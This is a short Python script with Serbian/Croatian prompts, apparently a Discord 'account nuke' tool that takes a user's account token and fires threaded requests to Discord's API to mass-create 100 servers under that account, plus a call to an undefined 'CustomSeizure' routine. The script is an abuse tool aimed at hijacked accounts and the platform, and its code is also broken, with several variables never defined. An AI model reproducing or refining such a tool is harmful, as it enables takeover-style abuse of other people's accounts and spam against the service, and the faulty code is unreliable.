import os, sys, time, requests, os.path, threading, random
from colorama import Fore
import time



print(f"""[>]   NAPISI TOKEN OD ACC KOJI ZELIS DA SERVER MAKEAS!""")
global usertoken
usertoken = str(input(f"""[--->] UPISI TOKEN: """))
def accnuke():

    def nuke(usertoken, Server_Name, message_Content):
        if threading.active_count() <= 100:
            t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
            t.start()

        print(f"\n{y}[>{y}]{m} PRAVI SERVERE")
        for i in range(100):
            try:
                payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v7/guilds', headers={'Authorization': usertoken}, json=payload)
                print(f"\t{y}[{Fore.LIGHTCYAN_EX }>{y}]{m} NAPRAVLJENO {Server_Name} #{i}")
            except Exception as e:
                print(f"\n{y}[>{y}]{m} IME SERVERA KOJI CE BITI NAPRAVLJENI: ")
                Server_Name = str(input(f'{y}[{m}--->{y}]{m} IME: '))
                message_Content = str(input(f'[--->] PORUKA: '))
                

    
    message_Content = str(input(f'[--->] PORUKA: '))
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
    threads = 100
    
    if threading.active_count() < threads:
        threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
        return
    

accnuke()       